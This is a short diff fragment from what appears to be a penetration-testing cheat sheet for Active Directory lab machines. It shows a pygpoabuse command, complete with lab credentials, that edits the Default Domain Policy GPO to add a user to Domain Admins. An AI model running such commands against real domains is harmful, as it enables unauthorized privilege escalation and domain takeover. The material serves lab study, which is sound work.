@@ -3420,7 +3420,7 @@ bloodyAD -d tombwatcher.htb -u sam -p '0xdf0xdf!' --host dc01.tombwatcher.htb ge
 ```
 ## pygpoabuse 
 ```
-# The command below will modify the GptTmpl.inf file configuration inside the specified GPO to add the account to the Domain Administrators group.
+# The command below will modify the GptTmpl.inf file configuration inside the DEFAULT DOMAIN POLICY GPO to add the account to the Domain Administrators group.
 pygpoabuse secura.yzx/charlotte:'Game2On4.!' -dc-ip 192.168.244.97 -gpo-id "31B2F340-016D-11D2-945F-00C04FB984F9" -command 'net group "Domain Admins" charlotte /add /domain'
 
 # Force the system to update the Policy (Run from the target Windows machine)
